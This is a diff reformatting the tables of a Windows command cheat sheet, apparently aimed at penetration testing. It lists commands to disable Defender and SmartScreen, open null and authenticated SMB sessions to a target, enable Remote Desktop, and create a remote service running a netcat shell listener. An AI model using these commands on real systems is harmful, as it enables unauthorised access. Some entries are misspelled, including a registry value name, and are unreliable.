@@ -6,8 +6,8 @@ order: 4
 
 >**Accounts and Privileges**
 
-Category | Topic | Command
-------------- | ------------- | -------------
+Topic | Command
+------------- | -------------
 Lauch with Admin Privs | ctrl+shift+enter 
 SID | S-[revision level]-[authority level]-[domain/computer]-RID
 Admin RID | 500
@@ -24,11 +24,15 @@ Run Progarm as another user | runas /u:fred "cmd /c echo Hello!", runas /smartca
 
 >**Antivirus**
 
+Topic | Command
+------------- | -------------
 AntiVirus | Turn off Windows Defender | control /name Microsoft.WindowsDefender
 AntiVirus | Turn off Smart Screen | control /name Microsoft.ActionCenter
 
 >**Inventory, File Search, and Counting**
 
+Topic | Command
+------------- | -------------
 Count Lines | <code> type "file" | find /c /v "" </code>
 Inventory Software | "dir /s ""c:\Program Files"" > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt" 
 Display File Contents | type [file], type *.[ext], type [file1] [file2]
@@ -68,12 +72,11 @@ Kill a Process | taskkill /PID [process_ID]
 
 >**Remote Access, SMB, and WMIC**
 
-See Current Privileges | whoami | 
-Remote Access, SMB, and WMIC | Windows null session | net use \\targetip "" /u:"" | 
-Remote Access, SMB, and WMIC | Establish an SMB session | net use \\[targetIP] [password] /u:[user] | 
-Remote Access, SMB, and WMIC | Mount a Share on Target | "net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user]" | 
-Remote Access, SMB, and WMIC | Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del" | 
-
+See Current Privileges | whoami 
+Windows null session | net use \\targetip "" /u:"" 
+Establish an SMB session | net use \\[targetIP] [password] /u:[user]
+Mount a Share on Target | net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] 
+Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del"
 Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe | 
 Remote Access, SMB, and WMIC | Turn on Remote Desktop / terminal services | reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 | 
 Remote Access, SMB, and WMIC | Remote Registry  | Put \\[MachineName] before [KeyName] | 
